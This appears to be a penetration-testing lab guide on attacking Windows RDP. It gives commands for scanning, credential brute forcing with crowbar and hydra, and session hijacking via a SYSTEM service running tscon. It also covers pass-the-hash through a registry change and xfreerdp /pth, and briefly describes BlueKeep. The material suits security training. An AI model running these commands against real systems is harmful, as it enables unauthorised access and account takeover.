
```
nmap -sV -sC 10.129.201.248 -p3389 --script rdp*
```
In addition, we can use `--packet-trace` to track the individual packages and inspect their contents manually. We can see that the `RDP cookies` (`mstshash=nmap`) used by Nmap to interact with the RDP server can be identified by `threat hunters` and various security services such as [Endpoint Detection and Response](https://en.wikipedia.org/wiki/Endpoint_detection_and_response) (`EDR`), and can lock us out as penetration testers on hardened networks.

A Perl script named [rdp-sec-check.pl](https://github.com/CiscoCXSecurity/rdp-sec-check) has also been developed by [Cisco CX Security Labs](https://github.com/CiscoCXSecurity) that can unauthentically identify the security settings of RDP servers based on the handshakes.

```
git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check

./rdp-sec-check.pl 10.129.201.248
```

==Interaction==

```
xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248
```

==Brute forcing==

```
Orbixio@htb[/htb]# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'

Orbixio@htb[/htb]# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

==RDP Session Hijacking==

![](https://academy.hackthebox.com/storage/modules/116/rdp_session-1-2.png)
To successfully impersonate a user without their password, we need to have `SYSTEM` privileges and use the Microsoft [tscon.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) binary that enables users to connect to another desktop session.
```cmd-session
C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```
A simple trick is to create a Windows service that, by default, will run as `Local System` and will execute any binary with `SYSTEM` privileges.
```cmd-session
C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

C:\htb> net start sessionhijack
```

==RDP Pass-the-Hash (PtH)==

- `Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, we will be prompted with the following error:

![](https://academy.hackthebox.com/storage/modules/116/rdp_session-4.png)

```cmd-session
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
```shell-session
Orbixio@htb[/htb]# xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

==BlueKeep==
The vulnerability is also based, as with SMB, on manipulated requests sent to the targeted service. However, the dangerous thing here is that the vulnerability does not require user authentication to be triggered. Instead, the vulnerability occurs after initializing the connection when basic settings are exchanged between client and server. This is known as a [Use-After-Free](https://cwe.mitre.org/data/definitions/416.html) (`UAF`) technique that uses freed memory to execute arbitrary code.
[CVE-2019-0708](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708).
